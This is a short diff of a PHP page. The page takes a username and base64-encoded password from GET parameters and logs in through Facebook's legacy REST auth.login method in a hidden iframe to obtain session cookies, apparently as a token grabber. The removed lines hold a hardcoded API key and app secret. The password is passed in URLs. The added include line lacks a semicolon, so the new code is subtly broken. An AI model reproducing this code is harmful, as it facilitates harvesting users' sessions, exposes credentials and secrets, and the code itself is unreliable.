@@ -1,17 +1,13 @@
 <?php
-
+include "inc.php"
  $user = $_GET["user"];
  $pass = base64_decode($_GET["pass"]);
 if($user){
- $apikey = "882a8490361da98702bf97a021ddc14d";
- $sec = "62f8ce9f74b12f84c123cc23437a4a32";
- $mdtet = "api_key=".$apikey."credentials_type=passwordemail=".$user."format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=".$pass."return_ssl_resources=0v=1.0".$sec;
- $Mapp= "api_key=".$apikey."&credentials_type=password&email=".$user."&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password=".$pass."&return_ssl_resources=0&v=1.0";
 ?>
-<iframe src="https://api.facebook.com/restserver.php?<?=$Mapp?>&sig=<?=md5($mdtet)?>" id="iframeID" frameborder="0"></iframe>
+<iframe src="<?=getLoginUrl($user,$pass)?>" id="iframeID" frameborder="0"></iframe>
 
 <script type="text/javascript">
- window.location.replace("../get_code.php?get=1");
+ window.location.replace("../?app=login&resend=true");
 </script>
 
 <?php }else{ ?>
